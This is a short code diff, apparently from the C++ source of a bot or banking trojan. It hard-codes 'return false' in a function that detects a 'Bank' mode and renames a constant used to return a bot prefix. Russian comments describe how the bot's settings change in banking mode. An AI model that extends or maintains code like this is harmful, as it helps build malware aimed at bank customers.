@@ -166,6 +166,9 @@ bool IsBankingMode()
 	// Функция возвращает истину если включен режим "Банк"
 	// В этом режиме настройки бота могут отличаться от обычных
 
+
+	return false;
+
 	string FileName = GetBankingModeFileName();
 	return !FileName.IsEmpty() && FileExistsA(FileName.t_str());
 }
@@ -181,7 +184,7 @@ char *GetPrefix()
 	#else
 		// Проверяем режим режим работы
 		if (IsBankingMode())
-			return BOT_BANK_PREFIX;
+			return BOT_PREFIX_BANK;
 
 		return  Decrypt(BOT_PREFIX);
 	#endif
